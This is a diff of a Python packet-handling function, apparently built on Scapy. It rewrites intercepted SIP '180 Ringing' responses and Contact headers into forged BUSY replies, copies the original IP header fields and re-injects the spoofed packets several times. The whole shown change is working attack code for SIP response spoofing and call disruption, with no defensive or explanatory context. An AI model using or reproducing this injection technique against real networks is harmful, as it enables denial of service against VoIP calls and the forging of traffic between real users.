@@ -39,17 +39,17 @@ def traffic_parser(packet):
 
         # print(payload)
         
+        # Implement packet modification
+        payload = payload.replace("SIP/2.0 180 Ringing", BUSY_1, 1)
+        payload = re.sub("Contact\:.*>", BUSY_2, payload,1)
+        # payload = payload.replace("Raw(load=b\'", '', 1)
+        # payload = re.sub("\'\)$", '', payload, 1)
+        # print(payload.replace('\\\\', '\\'))
+        # payload = payload.replace("\\\\", "\\")
+        payload = payload + "\r\n"
+
 
         for incr in range(1,5):
-
-            # Implement packet modification
-            payload = payload.replace("SIP/2.0 180 Ringing", BUSY_1, 1)
-            payload = re.sub("Contact\:.*>", BUSY_2, payload,1)
-            payload = payload.replace("Raw(load=b\'", '', 1)
-            payload = re.sub("\'\)$", '', payload, 1)
-            # print(payload.replace('\\\\', '\\'))
-            payload = payload.replace("\\\\", "\\")
-
 
             ip_attributes={}
             ip_attributes['version']=packet[1].version
@@ -65,10 +65,10 @@ def traffic_parser(packet):
             ip_attributes['dst']=packet[1].dst
 
             ip = IP_layer(ip_attributes)
+            
 
             sendp(eth/ip/udp/Raw(load=payload))
 
-            payload = payload + "\r\n\r"
             print(payload)
             # print(Raw(load=payload))
 
